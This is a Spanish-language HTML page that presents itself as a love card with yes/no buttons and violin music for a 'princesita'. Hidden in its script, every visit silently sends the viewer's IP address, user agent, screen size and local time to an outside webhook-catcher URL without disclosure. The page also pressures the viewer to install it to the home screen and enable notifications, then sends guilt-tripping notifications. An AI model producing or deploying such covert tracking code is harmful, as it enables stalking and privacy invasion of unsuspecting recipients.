<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<!-- iOS THEME -->
<meta name="theme-color" content="#000000">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">

<title>Para ti</title>

<style>
* {
    box-sizing: border-box;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
}

body {
    margin: 0;
    background: black;
    color: white;
    overflow: hidden;
}

/* CENTRADO */
.center {
    position: fixed;
    inset: 0;
    display: none;
    align-items: center;
    justify-content: center;
    text-align: center;
    padding: 25px;
}

/* ---------- START ---------- */
#startScreen {
    position: fixed;
    inset: 0;
    display: none;
    align-items: center;
    justify-content: center;
    cursor: pointer;
}

#startText {
    font-size: 1.4rem;
    opacity: 0;
    animation: fadeIn 2s ease forwards;
}

@keyframes fadeIn {
    to { opacity: 1; }
}

/* ---------- CONTENIDO ---------- */
#content {
    display: none;
    height: 100vh;
    width: 100%;
    align-items: center;
    justify-content: center;
}

.card-wrapper {
    position: relative;
    animation: float 3.8s ease-in-out infinite;
}

@keyframes float {
    0% { transform: translateY(0); }
    50% { transform: translateY(-18px); }
    100% { transform: translateY(0); }
}

.card-wrapper img {
    max-width: 90vw;
    max-height: 85vh;
    display: block;
}

.buttons {
    position: absolute;
    bottom: 20%;
    left: 50%;
    transform: translateX(-50%);
    display: flex;
    gap: 20px;
}

.btn {
    padding: 10px 22px;
    border-radius: 22px;
    border: none;
    font-size: 1rem;
}

.btn-yes {
    background: #f4c2c2;
    color: #5a2a2a;
}

.btn-no {
    background: #e0e0e0;
    color: #333;
}
</style>
</head>

<body>

<!-- MENSAJE -->
<div id="message" class="center"></div>

<!-- START -->
<div id="startScreen" class="center">
    <div id="startText">Da click para comenzar...</div>
</div>

<!-- CONTENIDO -->
<div id="content">
    <div class="card-wrapper">
        <img src="carta.png">
        <div class="buttons">
            <button class="btn btn-yes">SÃ­</button>
            <button class="btn btn-no">No</button>
        </div>
    </div>
</div>

<audio id="bgAudio" src="violin.mp3" loop></audio>

<script>
const ua = navigator.userAgent;
const isInstagram = ua.includes("Instagram");
const isStandalone = window.matchMedia('(display-mode: standalone)').matches;

const message = document.getElementById('message');
const startScreen = document.getElementById('startScreen');
const content = document.getElementById('content');
const audio = document.getElementById('bgAudio');

const mensajesNo = [
    "Â¿Segura? ðŸ˜¢",
    "PiÃ©nsalo otra vez...",
    "No hagas eso ðŸ’”",
    "Mi corazÃ³n no aguanta ðŸ˜”"
];

// ---------- FLUJO LIMPIO ----------
if (isInstagram) {
    message.textContent = "Hola princesita, necesito que abras esto desde Safari.";
    message.style.display = "flex";
    enviarWebhook("instagram");
}
else if (!isStandalone) {
    message.textContent =
        "SÃ© que es mucho pedir, pero necesito que presiones el botÃ³n de compartir, luego los tres puntitos, selecciones agregar a inicio, confirmes y me abras desde ahÃ­.";
    message.style.display = "flex";
    enviarWebhook("safari");
}
else {
    enviarWebhook("inicio");
    iniciarExperiencia();
}

// ---------- FUNCIONES ----------
function iniciarExperiencia() {
    startScreen.style.display = 'flex';

    startScreen.addEventListener('click', () => {
        startScreen.style.display = 'none';
        content.style.display = 'flex';

        if ("Notification" in window && Notification.permission !== "granted") {
            Notification.requestPermission();
        }

        audio.play().catch(()=>{});
    });

    document.querySelector('.btn-no').addEventListener('click', () => {
        if (Notification.permission === "granted") {
            const msg = mensajesNo[Math.floor(Math.random() * mensajesNo.length)];
            new Notification(msg);
        }
    });

    document.querySelector('.btn-yes').addEventListener('click', () => {
        audio.pause();
    });
}

// ---------- WEBHOOK ----------
async function enviarWebhook(ref) {
    let ip = "desconocida";
    try {
        const r = await fetch('https://api.ipify.org?format=json');
        ip = (await r.json()).ip;
    } catch(e){}

    const hora = new Intl.DateTimeFormat('es-MX', {
        timeZone: 'America/Monterrey',
        dateStyle: 'full',
        timeStyle: 'medium'
    }).format(new Date());

    fetch('https://tools.myaiteam.com/webhook-catcher/webhook/9fd0f343122174183e72a2ae69de43bd', {
        method: 'POST',
        headers: {'Content-Type':'application/json'},
        body: JSON.stringify({
            referrer: ref,
            ip,
            userAgent: navigator.userAgent,
            resolucion: `${screen.width}x${screen.height}`,
            hora
        })
    });
}
</script>

</body>
</html>
